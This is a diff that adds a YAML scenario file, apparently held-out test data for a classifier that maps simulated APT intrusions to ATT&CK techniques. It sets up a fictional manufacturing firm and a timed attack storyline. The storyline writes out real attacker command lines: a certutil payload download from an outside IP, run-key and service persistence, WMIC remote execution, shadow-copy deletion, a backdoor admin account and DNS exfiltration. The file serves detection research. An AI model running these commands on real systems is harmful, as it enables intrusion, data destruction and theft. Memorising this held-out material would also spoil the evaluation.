@@ -1,0 +1,371 @@
+version: "1.0"
+name: heldout-manufacturing
+description: |
+  Held-out generalization scenario for the APT classifier technique-mapping
+  evaluator. Deliberately shares no hosts, users, commands, or techniques with
+  the branch-office development scenario: a Windows-centric intrusion at a
+  small manufacturing firm that starts with a password spray against an
+  exposed jump host, escalates through credential dumping and persistence on
+  the domain controller, and exfiltrates over DNS.
+
+environment:
+  description: "Small precision-manufacturing firm with Active Directory, an ERP application server, an engineering file server, and an internet-facing jump host"
+  domain: "korvin-mfg.local"
+
+  timezone:
+    default: "Europe/Berlin"
+
+  users:
+    - username: jonas.weber
+      full_name: "Jonas Weber"
+      email: "jonas.weber@korvin-mfg.de"
+      persona: developer
+      primary_system: WS-JWEBER-02
+      groups: ["engineering"]
+      enabled: true
+      browsing_intensity: normal
+
+    - username: petra.lang
+      full_name: "Petra Lang"
+      email: "petra.lang@korvin-mfg.de"
+      persona: accountant
+      primary_system: WS-PLANG-02
+      groups: ["finance"]
+      enabled: true
+      browsing_intensity: light
+
+    - username: tomas.fiala
+      full_name: "Tomas Fiala"
+      email: "tomas.fiala@korvin-mfg.de"
+      persona: sysadmin
+      primary_system: WS-TFIALA-02
+      groups: ["it-ops", "domain-admins"]
+      enabled: true
+      browsing_intensity: light
+
+    - username: hanna.krug
+      full_name: "Hanna Krug"
+      email: "hanna.krug@korvin-mfg.de"
+      persona: executive
+      primary_system: WS-HKRUG-02
+      groups: ["management"]
+      enabled: true
+      browsing_intensity: normal
+
+    - username: erik.sand
+      full_name: "Erik Sand"
+      email: "erik.sand@korvin-mfg.de"
+      persona: sales
+      primary_system: WS-ESAND-02
+      groups: ["sales"]
+      enabled: true
+      browsing_intensity: heavy
+
+  service_accounts:
+    - svc-erp
+    - svc-backup-mfg
+    - svc-monitor
+
+  stale_accounts:
+    - username: intern.summer
+      last_active: "2023-09-30"
+      reason: "Summer intern account never disabled"
+
+  systems:
+    - hostname: WS-JWEBER-02
+      ip: "10.77.10.31"
+      os: "Windows 11 Enterprise"
+      type: workstation
+      assigned_user: jonas.weber
+      services: ["dns-client"]
+
+    - hostname: WS-PLANG-02
+      ip: "10.77.10.32"
+      os: "Windows 11 Enterprise"
+      type: workstation
+      assigned_user: petra.lang
+      services: ["dns-client"]
+
+    - hostname: WS-TFIALA-02
+      ip: "10.77.10.33"
+      os: "Windows 11 Enterprise"
+      type: workstation
+      assigned_user: tomas.fiala
+      services: ["dns-client"]
+
+    - hostname: WS-HKRUG-02
+      ip: "10.77.10.34"
+      os: "Windows 11 Enterprise"
+      type: workstation
+      assigned_user: hanna.krug
+      services: ["dns-client"]
+
+    - hostname: WS-ESAND-02
+      ip: "10.77.10.35"
+      os: "Windows 11 Enterprise"
+      type: workstation
+      assigned_user: erik.sand
+      services: ["dns-client"]
+
+    - hostname: DC-MFG-01
+      ip: "10.77.20.10"
+      os: "Windows Server 2022"
+      type: domain_controller
+      services: ["kerberos", "ldap", "dns", "windows-dhcp-server"]
+      roles: ["domain_controller", "dns_server", "dhcp_server"]
+
+    - hostname: ERP-MFG-01
+      ip: "10.77.20.20"
+      os: "Windows Server 2019"
+      type: server
+      services: ["smb", "dns-client"]
+      roles: ["file_server"]
+
+    - hostname: JUMP-MFG-01
+      ip: "10.77.30.10"
+      os: "Windows Server 2019"
+      type: server
+      services: ["rdp", "dns-client"]
+      roles: ["jump_host"]
+
+  network:
+    public_cidrs:
+      - "91.207.114.0/28"
+
+    segments:
+      - name: workstations
+        cidr: "10.77.10.0/24"
+        description: "Office workstation VLAN"
+        exposure: internal
+        systems: [WS-JWEBER-02, WS-PLANG-02, WS-TFIALA-02, WS-HKRUG-02, WS-ESAND-02]
+
+      - name: servers
+        cidr: "10.77.20.0/24"
+        description: "Internal server VLAN"
+        exposure: internal
+        systems: [DC-MFG-01, ERP-MFG-01]
+
+      - name: dmz
+        cidr: "10.77.30.0/24"
+        description: "DMZ with the remote-access jump host"
+        exposure: both
+        external_ratio: 0.6
+        systems: [JUMP-MFG-01]
+
+    sensors:
+      - type: network
+        name: mfg-core-span
+        hostname: ZEEK-MFG-CORE
+        monitoring_segments: [workstations, servers, dmz]
+        direction: bidirectional
+        placement: span
+        log_formats: [zeek]
+        description: "Core switch SPAN"
+
+time_window:
+  start: "2024-09-03T06:00:00Z"
+  duration: "6h"
+  warmup: "2h"
+
+baseline_activity:
+  description: "Normal manufacturing office workday with ERP access, engineering file share usage, and domain authentication."
+  intensity: medium
+  variation: medium
+  suspicious_noise: medium
+  traffic_rates:
+    web: low
+    user_activity: low
+    persona_connections: low
+
+observation_profile: complete
+logon_grace_period: "45m"
+
+storyline:
+  - id: mfg-001
+    time: "+40m"
+    actor: tomas.fiala
+    system: JUMP-MFG-01
+    activity: "Password spray against the internet-facing jump host"
+    events:
+      - type: credential_spray
+        technique: "T1110.003 - Brute Force: Password Spraying"
+        target_accounts: [tomas.fiala, jonas.weber, petra.lang, hanna.krug, erik.sand, intern.summer]
+        source_ip: "203.0.113.58"
+        logon_type: 10
+        interval: "20s"
+        count: 24
+        pattern: spray
+        success:
+          account: tomas.fiala
+          after: 20
+
+  - id: mfg-002
+    time: "+52m"
+    actor: tomas.fiala
+    system: JUMP-MFG-01
+    activity: "Successful RDP logon with the sprayed admin account and host discovery"
+    events:
+      - type: rdp_session
+        technique: "T1021.001 - Remote Services: Remote Desktop Protocol"
+        source_ip: "203.0.113.58"
+      - type: process
+        technique: "T1033 - System Owner/User Discovery"
+        process_name: "C:\\Windows\\System32\\whoami.exe"
+        command_line: "whoami /all"
+      - type: process
+        technique: "T1069.002 - Permission Groups Discovery: Domain Groups"
+        process_name: "C:\\Windows\\System32\\net.exe"
+        command_line: "net group \"Domain Admins\" /domain"
+      - type: process
+        technique: "T1482 - Domain Trust Discovery"
+        process_name: "C:\\Windows\\System32\\nltest.exe"
+        command_line: "nltest /dclist:korvin-mfg.local"
+
+  - id: mfg-003
+    time: "+1h5m"
+    actor: tomas.fiala
+    system: JUMP-MFG-01
+    activity: "Tooling staged on the jump host with a signed downloader and registry run key persistence"
+    events:
+      - type: process
+        technique: "T1105 - Ingress Tool Transfer"
+        process_name: "C:\\Windows\\System32\\certutil.exe"
+        command_line: "certutil.exe -urlcache -split -f http://203.0.113.58/upd/svchost.dat C:\\ProgramData\\svchost.dat"
+      - type: process
+        technique: "T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
+        process_name: "C:\\Windows\\System32\\reg.exe"
+        command_line: "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d C:\\ProgramData\\svchost.dat /f"
+      - type: process
+        technique: "T1218.011 - System Binary Proxy Execution: Rundll32"
+        process_name: "C:\\Windows\\System32\\rundll32.exe"
+        command_line: "rundll32.exe C:\\ProgramData\\svchost.dat,DllRegisterServer"
+
+  - id: mfg-004
+    time: "+1h20m"
+    actor: tomas.fiala
+    system: DC-MFG-01
+    activity: "Lateral movement to the domain controller with WMI and credential dumping from LSASS"
+    events:
+      - type: logon
+        technique: "T1078.002 - Valid Accounts: Domain Accounts"
+        logon_type: 3
+        source_ip: "10.77.30.10"
+      - type: process
+        technique: "T1047 - Windows Management Instrumentation"
+        process_name: "C:\\Windows\\System32\\wbem\\WMIC.exe"
+        command_line: "wmic /node:DC-MFG-01 process call create \"cmd.exe /c C:\\ProgramData\\svchost.dat\""
+      - type: process_access
+        technique: "T1003.001 - OS Credential Dumping: LSASS Memory"
+        target_process: "lsass.exe"
+        access_mask: "0x1010"
+
+  - id: mfg-005
+    time: "+1h32m"
+    actor: tomas.fiala
+    system: DC-MFG-01
+    activity: "Persistence on the domain controller through a new service and a scheduled task"
+    events:
+      - type: service_installed
+        technique: "T1543.003 - Create or Modify System Process: Windows Service"
+        service_name: "WinTelemetrySync"
+        service_file_name: "C:\\ProgramData\\svchost.dat"
+        service_account: "LocalSystem"
+      - type: scheduled_task_created
+        technique: "T1053.005 - Scheduled Task/Job: Scheduled Task"
+        task_name: "\\Microsoft\\Windows\\Maintenance\\TelemetrySync"
+        task_content: "cmd.exe /c C:\\ProgramData\\svchost.dat"
+
+  - id: mfg-006
+    time: "+1h40m"
+    actor: tomas.fiala
+    system: DC-MFG-01
+    activity: "Backdoor domain account created and added to Domain Admins"
+    events:
+      - type: account_created
+        technique: "T1136.002 - Create Account: Domain Account"
+        target_username: "svc-telemetry"
+      - type: group_member_added
+        technique: "T1098 - Account Manipulation"
+        group_name: "Domain Admins"
+        member_name: "svc-telemetry"
+        scope: global
+
+  - id: mfg-007
+    time: "+1h55m"
+    actor: tomas.fiala
+    system: ERP-MFG-01
+    activity: "Engineering data staged and shadow copies deleted on the ERP server"
+    events:
+      - type: logon
+        technique: "T1021.002 - Remote Services: SMB/Windows Admin Shares"
+        logon_type: 3
+        source_ip: "10.77.30.10"
+      - type: process
+        technique: "T1074.001 - Data Staged: Local Data Staging"
+        process_name: "C:\\Windows\\System32\\Robocopy.exe"
+        command_line: "robocopy.exe D:\\Engineering\\CAD C:\\Windows\\Temp\\cad_stage /E /R:1 /W:1"
+      - type: process
+        technique: "T1490 - Inhibit System Recovery"
+        process_name: "C:\\Windows\\System32\\vssadmin.exe"
+        command_line: "vssadmin.exe delete shadows /all /quiet"
+
+  - id: mfg-008
+    time: "+2h10m"
+    actor: tomas.fiala
+    system: ERP-MFG-01
+    activity: "Staged data exfiltrated over DNS TXT tunneling"
+    events:
+      - type: dns_tunnel
+        technique: "T1048.003 - Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol"
+        base_domain: "cdn-metrics-sync.net"
+        encoding: base32
+        qtype: TXT
+        interval: "4s"
+        count: 180
+        payload_size: 32768
+
+  - id: mfg-009
+    time: "+2h30m"
+    actor: tomas.fiala
+    system: DC-MFG-01
+    activity: "Security event log cleared on the domain controller"
+    events:
+      - type: log_cleared
+        technique: "T1070.001 - Indicator Removal: Clear Windows Event Logs"
+
+red_herrings:
+  - id: mfg-rh-001
+    time: "+3h5m"
+    actor: tomas.fiala
+    system: ERP-MFG-01
+    activity: "Scheduled nightly ERP backup job runs early for a maintenance window"
+    explanation: "Routine backup: the sysadmin triggered the standard backup task manually before patching"
+    events:
+      - type: process
+        process_name: "C:\\Windows\\System32\\Robocopy.exe"
+        command_line: "robocopy.exe D:\\ERP\\Data \\\\ERP-MFG-01\\Backups\\daily /MIR /LOG:C:\\Backups\\erp-daily.log"
+
+  - id: mfg-rh-002
+    time: "+3h20m"
+    actor: erik.sand
+    system: WS-ESAND-02
+    activity: "Sales user locks himself out after returning from vacation"
+    explanation: "Benign user error creating a small cluster of failed authentication evidence"
+    events:
+      - type: failed_logon
+        source_ip: "10.77.10.35"
+        logon_type: 2
+      - type: failed_logon
+        source_ip: "10.77.10.35"
+        logon_type: 2
+      - type: failed_logon
+        source_ip: "10.77.10.35"
+        logon_type: 2
+
+output:
+  logs:
+    - format: windows
+    - format: ecar
+    - format: zeek
+  destination: scenarios/heldout-manufacturing
+  compression: false
